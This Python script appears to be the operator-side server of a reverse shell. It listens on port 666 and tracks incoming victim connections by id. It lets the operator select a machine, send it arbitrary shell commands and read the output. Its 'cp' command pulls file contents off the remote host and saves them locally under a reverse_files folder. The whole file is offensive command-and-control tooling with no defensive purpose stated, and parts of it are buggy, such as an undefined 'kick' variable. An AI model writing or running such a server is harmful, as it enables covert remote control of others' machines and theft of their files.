import socket
import _thread as thread
import os
import time
import random
import string
list_connections = list()
list_conn = list()
threads_list = list()
new = 1
global target
target = None
chars = string.ascii_lowercase




class Handle_threads:
    def __init__(self,conn,addr):
        self.conn = conn
        self.addr = addr
        self.words = {'pwd','list','cls','clear'}
        self.hostname = None
    
    def get_hostname(self):
        self.conn.sendall('host'.encode())
        data = self.conn.recv(2000).decode()
        self.hostname = data
        print(self.hostname)

    def start(self):
        while True:
            try:
                if target is None:
                    print('Select [id]')
                    cmd = input('>')
                    if cmd.startswith('select') or cmd == '':
                        self.change_conn(cmd)
                        self.get_hostname()
                        os.system('clear')
                        
                    if cmd == 'list':
                            for i in list_connections:
                                print(i)
                else:
                    self.commands()
            except Exception as e:
                raise e

    def commands(self):
        try:
            if str(target) == str(self.conn):
                if self.hostname is None:
                    self.get_hostname()
                    
                cmd = input(f'{self.hostname}> ')

                if cmd == 'list':
                    for i in list_connections:
                        print(i)

                elif cmd.startswith('kick'):
                    n = cmd.split()[1]
                    for comp in list_connections:
                        comp_id = comp.split()[0]
                        if comp_id == n:
                            list_connections.remove(comp)
                            #list_conn.remove(i-1)
                        



                elif cmd == 'cls' or cmd== 'clear':
                    os.system('clear')

                elif cmd.startswith('select'):
                    self.change_conn(cmd)
                    self.get_hostname()

                elif cmd.startswith('cp'):
                    file_random = ''
                    self.conn.sendall(cmd.encode())
                    time.sleep(0.5)
                    content = self.conn.recv(30000).decode()
                    if content != 'not found':
                        for i in range(3):
                            file_random+= random.choice(chars)
                        with open(fr'/home/idan/Desktop/reverse_files/{str(cmd.split()[1]).split(".")[0]}_{file_random}.txt','a+') as file:
                            file.write(content)
                        file_random = ''
                    
                
                if cmd not in self.words and not cmd.startswith('select') and cmd != '': #testing 
                    cmd = cmd.encode()
                    
                    if cmd.decode().startswith('cd'):
                        try:
                            cmd.decode().split(' ')
                            self.conn.sendall(cmd)
                            time.sleep(0.4)
                            self.get_hostname()
                        except:
                            print('EXCEPT')
                    else:
                        self.conn.sendall(cmd)
                    if not cmd.decode().startswith('cd'):
                        data = self.conn.recv(18000).decode()
                        if data:
                            print(data)
        except Exception as e:
            print(e)
                        
                       



    def change_conn(self,cmd):
        global target
        try:
            id = int(cmd.split(' ')[1])
            for c in list_connections:
                num = int(c.split(' ')[0])
                if id == num:
                    target = list_conn[id-1]
                    if kick is True:
                        self.conn.close()
                        break
                    else:
                        self.get_hostname()
                        break
            if id != num:
                target = None
                print('Wrong id')

                   
        except Exception as e:
            print(e)
                

            
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('',666))
s.listen(5)

while True:
    conn, addr = s.accept()
    target = conn
    print(f'{new} New connection established')
    host = conn.recv(12000).decode()
    list_connections.append(f'{new} {addr} {host}')
    list_conn.append(conn)
    
    t = Handle_threads(conn,addr)
    
    new_thread = thread.start_new_thread(t.start,())
    new += 1

    